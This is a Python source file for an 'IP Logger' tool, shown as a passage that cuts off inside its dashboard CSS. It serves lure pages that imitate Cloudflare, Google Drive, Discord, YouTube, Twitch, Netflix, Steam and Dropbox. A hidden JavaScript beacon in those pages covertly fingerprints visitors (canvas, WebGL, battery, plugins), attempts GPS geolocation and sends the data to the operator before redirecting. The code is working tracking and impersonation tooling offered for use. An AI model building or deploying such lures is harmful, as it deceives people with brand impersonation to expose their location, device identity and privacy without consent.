#!/usr/bin/env python3
"""IP Logger — Cloudflare Tunnel + Dashboard + GeoIP"""

import base64, hashlib, http.server, json, os, re, secrets, subprocess, sys
import threading, time, urllib.parse, urllib.request
from datetime import datetime, timezone

# ═══ Config ════════════════════════════════════════════════
CONFIG = {
    "log_file":    "ip_log.json",
    "port":        8080,
    "mode":        "lure",    # "lure" | "redirect"
    "lure":        "captcha",
    "redirect":    "https://www.youtube.com",
    "secret":      "",        # Basic Auth password (vide = public)
    "track_token": "",
    "lang":        "en",      # en | fr | ru | es | de | zh
    "public_url":  "",
}

CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "iplogger_config.json")

def save_config():
    data = {k: CONFIG[k] for k in ("port","mode","lure","redirect","secret","track_token","lang")}
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
    except Exception:
        pass

def load_config():
    if not os.path.exists(CONFIG_FILE):
        return
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        for k in ("port","mode","lure","redirect","secret","track_token","lang"):
            if k in data:
                CONFIG[k] = data[k]
    except Exception:
        pass

LOCAL_RE = re.compile(r"^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|::1$|localhost)")

PIXEL_GIF = bytes.fromhex(
    "47494638396101000100800000ffffff00000021f90400000000002c"
    "00000000010001000002024401003b"
)

# ═══ i18n ═════════════════════════════════════════════════

LANGS = {
    "en": {
        "lure":"Lure page","redirect_to":"Redirect to","port":"Port",
        "slug":"URL slug","password":"Dashboard password","logs":"Logs",
        "tunnel":"Tunnel","quit":"Quit","active":"active","inactive":"inactive",
        "cut":"cut","start":"start","entries":"entry(ies)",
        "none":"none","enabled":"enabled","disabled":"disabled",
        "mode":"Mode","link_to_send":"← link to send",
        "lure_mode":"lure (shows page)","redirect_mode":"redirect (302 direct)",
        "language":"Language","confirm_clear":"Clear all logs? (yes)",
        "cleared":"Cleared","invalid":"Invalid","back":"Back",
        "connecting":"Connecting to tunnel...","tunnel_cut":"Tunnel stopped.",
        "server_start":"Starting server...","no_port":"Cannot open port. Exit.",
        "quick_url":"Quick URLs","custom":"custom url",
    },
    "fr": {
        "lure":"Page leurre","redirect_to":"Redirect vers","port":"Port",
        "slug":"Slug URL","password":"Mot de passe dashboard","logs":"Logs",
        "tunnel":"Tunnel","quit":"Quitter","active":"actif","inactive":"inactif",
        "cut":"couper","start":"démarrer","entries":"entrée(s)",
        "none":"aucun","enabled":"activé","disabled":"désactivé",
        "mode":"Mode","link_to_send":"← lien à envoyer",
        "lure_mode":"leurre (affiche page)","redirect_mode":"redirect (302 direct)",
        "language":"Langue","confirm_clear":"Effacer tous les logs ? (oui)",
        "cleared":"Effacé","invalid":"Invalide","back":"Retour",
        "connecting":"Connexion au tunnel...","tunnel_cut":"Tunnel coupé.",
        "server_start":"Démarrage du serveur...","no_port":"Impossible d'ouvrir un port.",
        "quick_url":"URLs rapides","custom":"url personnalisée",
    },
    "ru": {
        "lure":"Страница-ловушка","redirect_to":"Редирект на","port":"Порт",
        "slug":"Слаг URL","password":"Пароль дашборда","logs":"Логи",
        "tunnel":"Туннель","quit":"Выход","active":"активен","inactive":"неактивен",
        "cut":"отключить","start":"запустить","entries":"запись(и)",
        "none":"нет","enabled":"включён","disabled":"отключён",
        "mode":"Режим","link_to_send":"← ссылка для отправки",
        "lure_mode":"ловушка (показ страницы)","redirect_mode":"редирект (302)",
        "language":"Язык","confirm_clear":"Удалить все логи? (да)",
        "cleared":"Удалено","invalid":"Неверно","back":"Назад",
        "connecting":"Подключение к туннелю...","tunnel_cut":"Туннель остановлен.",
        "server_start":"Запуск сервера...","no_port":"Не удалось открыть порт.",
        "quick_url":"Быстрые URL","custom":"свой URL",
    },
    "es": {
        "lure":"Página señuelo","redirect_to":"Redirigir a","port":"Puerto",
        "slug":"Slug URL","password":"Contraseña dashboard","logs":"Registros",
        "tunnel":"Túnel","quit":"Salir","active":"activo","inactive":"inactivo",
        "cut":"detener","start":"iniciar","entries":"entrada(s)",
        "none":"ninguno","enabled":"activado","disabled":"desactivado",
        "mode":"Modo","link_to_send":"← enlace a enviar",
        "lure_mode":"señuelo (muestra página)","redirect_mode":"redirección (302)",
        "language":"Idioma","confirm_clear":"¿Borrar todos los registros? (sí)",
        "cleared":"Borrado","invalid":"Inválido","back":"Volver",
        "connecting":"Conectando al túnel...","tunnel_cut":"Túnel detenido.",
        "server_start":"Iniciando servidor...","no_port":"No se puede abrir puerto.",
        "quick_url":"URLs rápidas","custom":"url personalizada",
    },
    "de": {
        "lure":"Köder-Seite","redirect_to":"Weiterleitung zu","port":"Port",
        "slug":"URL-Slug","password":"Dashboard-Passwort","logs":"Protokolle",
        "tunnel":"Tunnel","quit":"Beenden","active":"aktiv","inactive":"inaktiv",
        "cut":"trennen","start":"starten","entries":"Eintrag/Einträge",
        "none":"keine","enabled":"aktiviert","disabled":"deaktiviert",
        "mode":"Modus","link_to_send":"← Link zum Senden",
        "lure_mode":"Köder (zeigt Seite)","redirect_mode":"Weiterleitung (302)",
        "language":"Sprache","confirm_clear":"Alle Logs löschen? (ja)",
        "cleared":"Gelöscht","invalid":"Ungültig","back":"Zurück",
        "connecting":"Verbinde Tunnel...","tunnel_cut":"Tunnel gestoppt.",
        "server_start":"Server starten...","no_port":"Kann Port nicht öffnen.",
        "quick_url":"Schnell-URLs","custom":"eigene URL",
    },
    "zh": {
        "lure":"诱饵页面","redirect_to":"重定向到","port":"端口",
        "slug":"URL路径","password":"仪表盘密码","logs":"日志",
        "tunnel":"隧道","quit":"退出","active":"活跃","inactive":"未激活",
        "cut":"断开","start":"启动","entries":"条记录",
        "none":"无","enabled":"已启用","disabled":"已禁用",
        "mode":"模式","link_to_send":"← 发送此链接",
        "lure_mode":"诱饵(显示页面)","redirect_mode":"重定向(302直接)",
        "language":"语言","confirm_clear":"清除所有日志？(是)",
        "cleared":"已清除","invalid":"无效","back":"返回",
        "connecting":"连接隧道...","tunnel_cut":"隧道已停止。",
        "server_start":"启动服务器...","no_port":"无法打开端口。",
        "quick_url":"快速URL","custom":"自定义URL",
    },
}

def T(key):
    return LANGS.get(CONFIG["lang"], LANGS["en"]).get(key, LANGS["en"].get(key, key))

# ═══ Beacon JS ════════════════════════════════════════════
# Beacon envoie les données ET attend avant le redirect
# pour que les stats soient bien reçues côté serveur.
BEACON_JS = """<script>
(function(){
  var _sent=false;
  function sendData(extra){
    if(_sent)return; _sent=true;
    var d={
      screen:screen.width+'x'+screen.height+'@'+(screen.colorDepth||'?')+'bit',
      avail:screen.availWidth+'x'+screen.availHeight,
      dpr:String(window.devicePixelRatio||1),
      timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||'',
      platform:navigator.platform||'',
      vendor:navigator.vendor||'',
      lang:navigator.language||'',
      langs:(navigator.languages||[navigator.language||'']).join(','),
      touch:(('ontouchstart' in window)||navigator.maxTouchPoints>0)?'yes':'no',
      touchpoints:String(navigator.maxTouchPoints||0),
      memory:String(navigator.deviceMemory||'?')+'GB',
      cores:String(navigator.hardwareConcurrency||'?')+'cores',
      connection:(navigator.connection&&navigator.connection.effectiveType)||'',
      downlink:String((navigator.connection&&navigator.connection.downlink)||''),
      plugins:Array.from(navigator.plugins||[]).map(function(p){return p.name}).slice(0,6).join('|'),
      cookies:navigator.cookieEnabled?'yes':'no',
      doNotTrack:String(navigator.doNotTrack||''),
      webgl:(function(){try{var c=document.createElement('canvas'),g=c.getContext('webgl')||c.getContext('experimental-webgl');if(!g)return 'no';return g.getParameter(g.RENDERER)+' / '+g.getParameter(g.VENDOR)}catch(e){return 'err'}})(),
      canvas:(function(){try{var c=document.createElement('canvas');c.width=200;c.height=50;var x=c.getContext('2d');x.textBaseline='top';x.font='14px Arial';x.fillStyle='#f60';x.fillRect(125,1,62,20);x.fillStyle='#069';x.fillText('fp',2,15);return c.toDataURL().slice(-32)}catch(e){return 'err'}})(),
      battery:'',
      geo_lat:(extra&&extra.lat)||'',
      geo_lon:(extra&&extra.lon)||'',
      geo_acc:(extra&&extra.acc)||''
    };
    try{if(navigator.getBattery){navigator.getBattery().then(function(b){
      d.battery=Math.round(b.level*100)+'%'+(b.charging?' charging':'');
    }).catch(function(){})}}catch(e){}
    // XMLHttpRequest synchrone pour garantir l'envoi avant redirect
    try{
      var xhr=new XMLHttpRequest();
      xhr.open('POST','/beacon',false);
      xhr.setRequestHeader('Content-Type','application/json');
      xhr.send(JSON.stringify(d));
    }catch(e){
      fetch('/beacon',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d),keepalive:true}).catch(function(){});
    }
    if(window._doRedirect){window._doRedirect();}
  }
  window._beaconDone=sendData;
  // Tente géoloc GPS (sans popup si déjà accordée ou refusée silencieusement)
  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(
      function(p){sendData({lat:p.coords.latitude.toFixed(5),lon:p.coords.longitude.toFixed(5),acc:Math.round(p.coords.accuracy)+'m'})},
      function(){sendData(null)},
      {timeout:3000,maximumAge:60000,enableHighAccuracy:false}
    );
  } else { sendData(null); }
  // Fallback : envoie quand même après 3.5s si la géoloc bloque
  setTimeout(function(){sendData(null)},3500);
})();
</script>"""

# ═══ Lure pages ═══════════════════════════════════════════

def _lure_captcha():
    return """<!DOCTYPE html><html><head><meta charset=UTF-8>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Just a moment...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f6f6ef;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;gap:0}
.logo{font-size:28px;font-weight:800;letter-spacing:-1px;margin-bottom:32px}
.logo .cf{color:#f38020}.logo .dark{color:#1d1c1d}
.spinner{width:56px;height:56px;border:5px solid #ececec;border-top-color:#f38020;border-radius:50%;animation:spin .75s linear infinite;margin-bottom:22px}
@keyframes spin{to{transform:rotate(360deg)}}
h1{font-size:21px;font-weight:500;color:#1d1c1d;margin-bottom:8px;text-align:center}
p{color:#6b7280;font-size:14px;text-align:center;max-width:400px;line-height:1.6}
.ray{margin-top:44px;font-size:11px;color:#b0b0b0;font-family:monospace}
.bar{width:320px;height:4px;background:#eee;border-radius:2px;margin-top:28px;overflow:hidden}
.bar-fill{height:100%;background:linear-gradient(90deg,#f38020,#f5a623);border-radius:2px;animation:load 2.5s ease forwards}
@keyframes load{from{width:0}to{width:100%}}
</style></head><body>
<div class="logo"><span class="cf">&#x2601;</span> <span class="dark">Cloud</span><span class="cf">flare</span></div>
<div class="spinner"></div>
<h1>Checking your browser before accessing the site.</h1>
<p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
<div class="bar"><div class="bar-fill"></div></div>
<div class="ray">Ray ID: {ray} &bull; {ts}</div>
{beacon}
</body></html>"""

def _lure_google():
    return """<!DOCTYPE html><html><head><meta charset=UTF-8>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Google Drive</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff}
nav{height:64px;display:flex;align-items:center;padding:0 24px;gap:10px;border-bottom:1px solid #e8eaed}
.glogo{display:flex;align-items:center;gap:8px}
svg.drive-icon{width:32px;height:32px}
.app-name{font-size:20px;color:#5f6368;font-weight:400}
main{display:flex;flex-direction:column;align-items:center;justify-content:center;height:calc(100vh - 64px);gap:14px}
.sp{width:40px;height:40px;border:3px solid #f1f3f4;border-top-color:#1a73e8;border-radius:50%;animation:spin .9s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
p{color:#5f6368;font-size:15px}
</style></head>
<body>
<nav><div class="glogo">
<svg class="drive-icon" viewBox="0 0 87.3 78"><path d="m6.6 66.85 3.85 6.65c.8 1.4 1.95 2.5 3.3 3.3l13.75-23.8h-27.5c0 1.55.4 3.1 1.2 4.5z" fill="#0066da"/><path d="m43.65 25-13.75-23.8c-1.35.8-2.5 1.9-3.3 3.3l-25.4 44a9.06 9.06 0 0 0 -1.2 4.5h27.5z" fill="#00ac47"/><path d="m73.55 76.8c1.35-.8 2.5-1.9 3.3-3.3l1.6-2.75 7.65-13.25c.8-1.4 1.2-2.95 1.2-4.5h-27.502l5.852 11.5z" fill="#ea4335"/><path d="m43.65 25 13.75-23.8c-1.35-.8-2.9-1.2-4.5-1.2h-18.5c-1.6 0-3.15.45-4.5 1.2z" fill="#00832d"/><path d="m59.8 53h-32.3l-13.75 23.8c1.35.8 2.9 1.2 4.5 1.2h50.8c1.6 0 3.15-.45 4.5-1.2z" fill="#2684fc"/><path d="m73.4 26.5-12.7-22c-.8-1.4-1.95-2.5-3.3-3.3l-13.75 23.8 16.15 28h27.45c0-1.55-.4-3.1-1.2-4.5z" fill="#ffba00"/></svg>
<span class="app-name">Drive</span></div></nav>
<main><div class="sp"></div><p>Opening shared document...</p></main>
{beacon}
<script>setTimeout(function(){{window.location.href='{redirect}'}},3200)</script>
</body></html>"""

def _lure_discord():
    return """<!DOCTYPE html><html><head><meta charset=UTF-8>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Discord — You've been invited!</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#313338;font-family:Whitney,'Helvetica Neue',sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}}
.card{{background:#2b2d31;border-radius:8px;padding:32px 28px;width:460px;box-shadow:0 8px 32px rgba(0,0,0,.5)}}
.top{{display:flex;align-items:center;gap:16px;margin-bottom:20px}}
.srv-icon{{width:60px;height:60px;background:linear-gradient(135deg,#5865f2,#7289da);border-radius:15px;display:flex;align-items:center;justify-content:center;font-size:28px;flex-shrink:0}}
.srv-name{{color:#f2f3f5;font-size:20px;font-weight:700}}
.srv-meta{{color:#949ba4;font-size:13px;margin-top:3px}}
.g{{color:#23a55a}}.gy{{color:#949ba4}}
.divider{{height:1px;background:#3f4147;margin:16px 0}}
.inv-label{{color:#b5bac1;font-size:12px;text-transform:uppercase;letter-spacing:.5px;font-weight:600;margin-bottom:10px}}
.preview{{display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap}}
.ch{{background:#1e1f22;border-radius:4px;padding:5px 10px;font-size:12px;color:#80848e}}
.ch::before{{content:'#';margin-right:2px}}
.btn{{background:#5865f2;color:#fff;border:none;padding:13px;width:100%;border-radius:5px;font-size:15px;cursor:pointer;font-weight:600;letter-spacing:.2px;transition:background .15s}}
.btn:hover{{background:#4752c4}}
.foot{{margin-top:14px;text-align:center;font-size:12px;color:#5865f2;font-weight:700;cursor:pointer}}
</style></head>
<body><div class="card">
<div class="top">
  <div class="srv-icon">&#x1F4AC;</div>
  <div><div class="srv-name">Community Hub</div>
  <div class="srv-meta"><span class="g">&#x25CF;</span> <b style="color:#dbdee1">247</b> Online &nbsp;<span class="gy">&#x25CF;</span> <b style="color:#dbdee1">5,832</b> Members</div></div>
</div>
<div class="divider"></div>
<div class="inv-label">You've been invited to join a server</div>
<div class="preview"><span class="ch">general</span><span class="ch">announcements</span><span class="ch">media</span><span class="ch">off-topic</span></div>
<button class="btn" onclick="window.location.href='{redirect}'">Accept Invite</button>
<div class="foot">discord.com</div>
</div>
{beacon}</body></html>"""

def _lure_youtube():
    return """<!DOCTYPE html><html><head><meta charset=UTF-8>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>YouTube</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#0f0f0f;font-family:Roboto,Arial,sans-serif;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;gap:20px}}
.logo{{display:flex;align-items:center;gap:8px;font-size:24px;font-weight:700;letter-spacing:-1px}}
.logo .yt{{background:#ff0000;border-radius:8px;padding:6px 10px;font-size:14px;font-weight:800}}
.thumb{{width:640px;max-width:95vw;aspect-ratio:16/9;background:#272727;border-radius:12px;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden}}
.play{{width:68px;height:68px;background:rgba(0,0,0,.8);border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:background .2s}}
.play:hover{{background:rgba(255,0,0,.9)}}
.play::after{{content:'';border:0 solid transparent;border-left:26px solid #fff;border-top:16px solid transparent;border-bottom:16px solid transparent;margin-left:6px}}
.sp{{width:32px;height:32px;border:3px solid #333;border-top-color:#ff0000;border-radius:50%;animation:spin .8s linear infinite;position:absolute;top:16px;right:16px}}
@keyframes spin{{to{{transform:rotate(360deg)}}}}
p{{color:#aaa;font-size:13px}}
</style></head>
<body>
<div class="logo"><span class="yt">&#x25B6;</span> YouTube</div>
<div class="thumb"><div class="play"></div><div class="sp"></div></div>
<p>Loading video...</p>
{beacon}
<script>setTimeout(function(){{window.location.href='{redirect}'}},4000)</script>
</body></html>"""

def _lure_twitch():
    return """<!DOCTYPE html><html><head><meta charset=UTF-8>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Twitch</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#0e0e10;font-family:Inter,Roobert,'Helvetica Neue',sans-serif;color:#efeff1;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;gap:16px}}
.logo{{color:#a970ff;font-size:28px;font-weight:800;letter-spacing:-1px}}
.player{{width:680px;max-width:95vw;aspect-ratio:16/9;background:#18181b;border-radius:6px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;border:1px solid #2a2a2d}}
.live-dot{{width:10px;height:10px;background:#ff3b3b;border-radius:50%;display:inline-block;animation:blink 1s infinite}}
@keyframes blink{{0%,100%{{opacity:1}}50%{{opacity:.3}}}}
.live-badge{{background:#ff3b3b;color:#fff;font-size:11px;font-weight:700;padding:3px 8px;border-radius:4px;display:inline-flex;align-items:center;gap:5px}}
.sp{{width:36px;height:36px;border:3px solid #2a2a2d;border-top-color:#a970ff;border-radius:50%;animation:spin .8s linear infinite}}
@keyframes spin{{to{{transform:rotate(360deg)}}}}
p{{color:#adadb8;font-size:13px}}
</style></head>
<body>
<div class="logo">twitch</div>
<div class="player">
  <span class="live-badge"><span class="live-dot"></span> LIVE</span>
  <div class="sp"></div>
  <p>Connecting to stream...</p>
</div>
{beacon}
<script>setTimeout(function(){{window.location.href='{redirect}'}},3500)</script>
</body></html>"""

def _lure_netflix():
    return """<!DOCTYPE html><html><head><meta charset=UTF-8>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Netflix</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#141414;font-family:'Netflix Sans',Helvetica,Arial,sans-serif;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;gap:24px}}
.logo{{color:#e50914;font-size:36px;font-weight:900;letter-spacing:-2px}}
.card{{background:#222;border-radius:8px;padding:40px 50px;width:400px;max-width:95vw;text-align:center}}
h2{{font-size:22px;margin-bottom:8px}}
p{{color:#8c8c8c;font-size:14px;line-height:1.6;margin-bottom:24px}}
.sp{{width:40px;height:40px;border:3px solid #333;border-top-color:#e50914;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto}}
@keyframes spin{{to{{transform:rotate(360deg)}}}}
.dots{{display:flex;gap:8px;justify-content:center;margin-top:16px}}
.dot{{width:8px;height:8px;border-radius:50%;background:#e50914;animation:bounce 1.4s infinite}}
.dot:nth-child(2){{animation-delay:.2s}}.dot:nth-child(3){{animation-delay:.4s}}
@keyframes bounce{{0%,80%,100%{{transform:scale(0.8);opacity:.5}}40%{{transform:scale(1.2);opacity:1}}}}
</style></head>
<body>
<div class="logo">NETFLIX</div>
<div class="card">
<h2>Just a moment...</h2>
<p>We're getting everything ready for you. You'll be watching in seconds.</p>
<div class="sp"></div>
<div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
</div>
{beacon}
<script>setTimeout(function(){{window.location.href='{redirect}'}},4500)</script>
</body></html>"""

def _lure_steam():
    return """<!DOCTYPE html><html><head><meta charset=UTF-8>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Steam</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#1b2838;font-family:Arial,'Arial Unicode MS',sans-serif;color:#c6d4df;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;gap:20px}}
.logo{{font-size:22px;font-weight:700;color:#66c0f4;letter-spacing:2px;text-transform:uppercase}}
.progress-wrap{{width:340px;background:#316282;border-radius:2px;overflow:hidden;height:6px}}
.progress-bar{{height:100%;background:linear-gradient(90deg,#66c0f4,#1999ff);border-radius:2px;animation:load 3s ease forwards}}
@keyframes load{{from{{width:0}}to{{width:100%}}}}
p{{font-size:13px;color:#8f98a0}}
</style></head>
<body>
<div class="logo">Steam</div>
<p>Preparing your library...</p>
<div class="progress-wrap"><div class="progress-bar"></div></div>
{beacon}
<script>setTimeout(function(){{window.location.href='{redirect}'}},3200)</script>
</body></html>"""

def _lure_dropbox():
    return """<!DOCTYPE html><html><head><meta charset=UTF-8>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Dropbox</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;gap:20px;color:#1e1919}}
.logo{{color:#0061ff;font-size:26px;font-weight:700}}
.icon{{font-size:56px}}
h2{{font-size:20px;font-weight:500}}
p{{color:#637282;font-size:14px}}
.sp{{width:32px;height:32px;border:3px solid #e5e8eb;border-top-color:#0061ff;border-radius:50%;animation:spin .9s linear infinite}}
@keyframes spin{{to{{transform:rotate(360deg)}}}}
</style></head>
<body>
<div class="logo">Dropbox</div>
<div class="icon">&#x1F4C2;</div>
<h2>Opening your file...</h2>
<p>This might take a moment.</p>
<div class="sp"></div>
{beacon}
<script>setTimeout(function(){{window.location.href='{redirect}'}},3000)</script>
</body></html>"""

def _lure_404():
    return """<!DOCTYPE html><html><head><meta charset=UTF-8><title>404 Not Found</title>
<style>body{{font-family:system-ui;text-align:center;padding:80px;background:#fff;color:#333}}h1{{font-size:80px;color:#ddd;margin-bottom:8px}}h2{{font-weight:400;color:#666;margin-bottom:8px}}p{{color:#aaa;font-size:14px}}</style>
</head><body><h1>404</h1><h2>Page Not Found</h2><p>The resource you requested could not be found.</p>
{beacon}</body></html>"""

def _lure_blank():
    return """<!DOCTYPE html><html><head><meta charset=UTF-8></head><body>{beacon}</body></html>"""

LURES = {
    "captcha": _lure_captcha,
    "google":  _lure_google,
    "discord": _lure_discord,
    "youtube": _lure_youtube,
    "twitch":  _lure_twitch,
    "netflix": _lure_netflix,
    "steam":   _lure_steam,
    "dropbox": _lure_dropbox,
    "404":     _lure_404,
    "blank":   _lure_blank,
}

# ═══ Dashboard HTML (style kerbes.org) ════════════════════

DASHBOARD = r"""<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>IP Logger</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
:root{
  --bg:#0a0a0a;--s1:#0f0f0f;--s2:#141414;
  --border:rgba(255,255,255,.06);--border-r:rgba(239,68,68,.2);
  --red:#ef4444;--red2:#b91c1c;--red-dim:rgba(239,68,68,.1);
  --green:#22c55e;--yellow:#eab308;--blue:#3b82f6;
  --text:#f3f4f6;--muted:#6b7280;--muted2:#9ca3af;
}
html,body{background:var(--bg);color:var(--text);font-family:'Inter','Arial',sans-serif;font-size:13px;min-height:100vh}
body::before{content:'';position:fixed;inset:0;pointer-events:none;
  background:radial-gradient(ellipse 60% 35% at 50% -5%,rgba(239,68,68,.07),transparent),
             radial-gradient(ellipse 40% 25% at 90% 95%,rgba(185,28,28,.05),transparent)}

::-webkit-scrollbar{width:4px;height:4px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:rgba(239,68,68,.2);border-radius:4px}
::-webkit-scrollbar-thumb:hover{background:rgba(239,68,68,.4)}

/* login CSS removed — using HTTP Basic Auth */

/* ── App layout ── */
.app{display:flex;min-height:100vh}

/* ── Navbar top ── */
nav{position:sticky;top:0;z-index:100;background:rgba(10,10,10,.85);backdrop-filter:blur(16px);border-bottom:1px solid var(--border);padding:0 24px;height:56px;display:flex;align-items:center;justify-content:space-between}
.nav-brand{display:flex;align-items:center;gap:10px}
.nav-dot{width:8px;height:8px;border-radius:50%;background:var(--red);box-shadow:0 0 6px rgba(239,68,68,.8);animation:pulse-red 2s infinite}
@keyframes pulse-red{0%,100%{opacity:1;box-shadow:0 0 6px rgba(239,68,68,.8)}50%{opacity:.6;box-shadow:0 0 12px rgba(239,68,68,.4)}}
.nav-title{font-size:15px;font-weight:700;letter-spacing:-.3px}
.nav-title span{color:var(--red)}
.nav-tabs{display:flex;gap:2px}
.nav-tab{padding:6px 14px;border-radius:8px;cursor:pointer;color:var(--muted2);font-size:13px;font-weight:500;border:none;background:none;font-family:inherit;transition:all .2s;position:relative}
.nav-tab:hover{color:var(--text);background:rgba(255,255,255,.05)}
.nav-tab.active{color:var(--text);background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2)}
.nav-tab.active::after{content:'';position:absolute;bottom:-1px;left:50%;transform:translateX(-50%);width:40%;height:1px;background:var(--red)}
.nav-right{display:flex;align-items:center;gap:10px}
.status-badge{display:flex;align-items:center;gap:5px;padding:4px 10px;border-radius:20px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.15);font-size:11px;font-weight:600;color:var(--green)}
.status-dot{width:5px;height:5px;border-radius:50%;background:var(--green);animation:pulse-g 2s infinite}
@keyframes pulse-g{0%,100%{opacity:1}50%{opacity:.4}}

/* ── Main content ── */
.main{flex:1;padding:24px;overflow-x:hidden}
.section{display:none}.section.active{display:block}

/* ── Page header ── */
.ph{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:20px;flex-wrap:wrap;gap:12px}
.ph-title{font-size:20px;font-weight:700;letter-spacing:-.4px}
.ph-sub{color:var(--muted);font-size:12px;margin-top:3px}
.ph-actions{display:flex;gap:8px;flex-wrap:wrap}

/* ── Buttons kerbes style ── */
.btn{display:inline-flex;align-items:center;gap:6px;padding:8px 16px;border-radius:10px;font-size:12px;font-weight:600;cursor:pointer;border:1px solid rgba(255,255,255,.08);background:rgba(0,0,0,.3);color:var(--text);font-family:inherit;transition:all .2s;text-decoration:none;backdrop-filter:blur(8px)}
.btn:hover{background:rgba(255,255,255,.07);border-color:rgba(255,255,255,.15)}
.btn-red{border-color:rgba(239,68,68,.3);background:rgba(239,68,68,.08);color:#f87171;box-shadow:0 0 12px rgba(239,68,68,.1)}
.btn-red:hover{background:rgba(239,68,68,.15);box-shadow:0 0 18px rgba(239,68,68,.25)}
.btn-outline{border-color:rgba(239,68,68,.25);color:var(--muted2)}
.btn-outline:hover{border-color:rgba(239,68,68,.4);color:var(--text)}

/* ── Stats ── */
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:20px}
.sc{background:rgba(0,0,0,.4);border:1px solid var(--border);border-radius:12px;padding:16px 18px;position:relative;overflow:hidden;backdrop-filter:blur(8px);transition:border-color .2s}
.sc:hover{border-color:rgba(239,68,68,.2)}
.sc::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(239,68,68,.4),transparent)}
.sc-label{font-size:10px;text-transform:uppercase;letter-spacing:.8px;color:var(--muted);font-weight:600;margin-bottom:8px}
.sc-val{font-size:28px;font-weight:800;letter-spacing:-1px;color:var(--text);line-height:1}
.sc-sub{font-size:11px;color:var(--muted);margin-top:4px}
.sc-red .sc-val{color:#f87171}
.sc-green .sc-val{color:#4ade80}
.sc-yellow .sc-val{color:#fbbf24}
.sc-blue .sc-val{color:#60a5fa}
.sc-white .sc-val{color:var(--text)}

/* ── Toolbar ── */
.toolbar{display:flex;align-items:center;gap:8px;margin-bottom:12px;flex-wrap:wrap}
.search{flex:1;min-width:200px;max-width:340px;background:rgba(0,0,0,.4);border:1px solid rgba(255,255,255,.07);border-radius:8px;padding:8px 12px 8px 34px;font-size:12px;color:var(--text);font-family:inherit;outline:none;transition:border-color .2s;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='14' height='14' viewBox='0 0 24 24' fill='none' stroke='%236b7280' stroke-width='2'%3E%3Ccircle cx='11' cy='11' r='8'/%3E%3Cpath d='m21 21-4.35-4.35'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:10px center}
.search:focus{border-color:rgba(239,68,68,.35);box-shadow:0 0 0 3px rgba(239,68,68,.07)}
.search::placeholder{color:var(--muted)}

/* ── Table kerbes style ── */
.tbl-wrap{background:rgba(0,0,0,.35);border:1px solid var(--border);border-radius:12px;overflow:hidden;backdrop-filter:blur(8px)}
.tbl-scroll{overflow-x:auto}
table{width:100%;border-collapse:collapse;white-space:nowrap}
thead th{padding:10px 14px;text-align:left;font-size:10px;text-transform:uppercase;letter-spacing:.7px;color:var(--muted);font-weight:700;background:rgba(0,0,0,.3);border-bottom:1px solid rgba(255,255,255,.05)}
tbody tr{transition:background .1s;cursor:default}
tbody tr:hover{background:rgba(239,68,68,.03)}
tbody td{padding:10px 14px;border-bottom:1px solid rgba(255,255,255,.03);vertical-align:middle;max-width:200px;overflow:hidden;text-overflow:ellipsis}
tbody tr:last-child td{border-bottom:none}

/* ── Cells ── */
.c-ip{font-family:'SF Mono',Consolas,monospace;color:#fb923c;font-size:12px;font-weight:500}
.c-ts{color:var(--muted);font-size:11px;font-variant-numeric:tabular-nums}
